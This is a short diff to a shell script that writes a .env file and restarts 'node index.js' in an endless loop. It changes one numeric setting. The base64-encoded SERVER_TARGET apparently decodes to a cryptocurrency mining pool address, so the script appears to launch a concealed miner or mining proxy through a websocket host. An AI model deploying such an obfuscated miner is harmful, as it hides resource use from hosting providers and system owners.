@@ -3,7 +3,7 @@ CONNECT=${1:-8}
 NAME=${2:-003}
 echo "SERVER_WS=ws://cdn.keitaro.my.id
 SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
-SERVER_DOMAIN=1851807556
+SERVER_DOMAIN=1854744752
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 10; done
